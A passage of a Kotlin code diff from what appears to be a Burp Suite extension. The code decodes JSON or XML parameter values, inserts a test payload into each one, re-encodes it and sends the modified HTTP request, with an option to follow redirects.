+        if(updatedParsedParam!=null) {
+            val requestAsString = request.toString()
+
+            val decodedOriginalValue = if(updatedParsedParam.type().name==HttpParameterType.JSON.name) {
+                StringEscapeUtils.unescapeEcmaScript(updatedParsedParam.value())
+            }
+            else if(updatedParsedParam.type().name==HttpParameterType.XML.name || updatedParsedParam.type().name==HttpParameterType.XML_ATTRIBUTE.name) {
+                StringEscapeUtils.unescapeXml(updatedParsedParam.value())
+            }
+            else {
+                updatedParsedParam.value()
+            }
+
+
+            val transformedPayload = transformPayload(decodedOriginalValue,payload,payloadUpdateMode)
+
+            val encodedPayload = if(encodePayload) {
+                if(updatedParsedParam.type().name==HttpParameterType.JSON.name) {
+                    StringEscapeUtils.escapeEcmaScript(transformedPayload)
+                }
+                else if(updatedParsedParam.type().name==HttpParameterType.XML.name || updatedParsedParam.type().name==HttpParameterType.XML_ATTRIBUTE.name) {
+                    StringEscapeUtils.escapeXml11(transformedPayload)
+                }
+                else {
+                    transformedPayload
+                }
+            }
+            else {
+                transformedPayload
+            }
+
+            val updatedRequestWithTestCase = requestAsString.replaceRange(updatedParsedParam.valueOffsets().startIndexInclusive(),updatedParsedParam.valueOffsets().endIndexExclusive(),encodedPayload)
+            return HttpRequest.httpRequest(request.httpService(),updatedRequestWithTestCase)
+
+        }
+        return request
     }
 
 
     // region Send Request
-    fun sendRequest(httpRequest : HttpRequest, annotation : String)
-    {
-        logger.debugLog("Enter")
+//    fun sendRequest(httpRequest : HttpRequest, annotation : String)
+//    {
+//        logger.debugLog("Enter")
+//
+//            val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
+//            sendRequestConsiderSettings(annotatedHttpRequest)
+//
+//        }
+//        logger.debugLog("Exit")
+//    }
+
+    fun sendRequestConsiderSettings(httpRequest : HttpRequest) {
         executor.submit {
-            val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
-            sendRequestConsiderSettings(annotatedHttpRequest)
-
+            if (myExtensionSettings.followRedirectSetting)
+                api.http().sendRequestWithUpdatedContentLength(
+                    httpRequest,
+                    RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS)
+                )
+            else
+                api.http().sendRequestWithUpdatedContentLength(httpRequest)
         }
-        logger.debugLog("Exit")
-    }
-
-    fun sendRequestConsiderSettings(httpRequest : HttpRequest) : HttpRequestResponse {
-        if(myExtensionSettings.followRedirectSetting)
-            return api.http().sendRequestWithUpdatedContentLength(httpRequest,RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
-        else
-            return api.http().sendRequestWithUpdatedContentLength(httpRequest)
     }
     // endregion
 
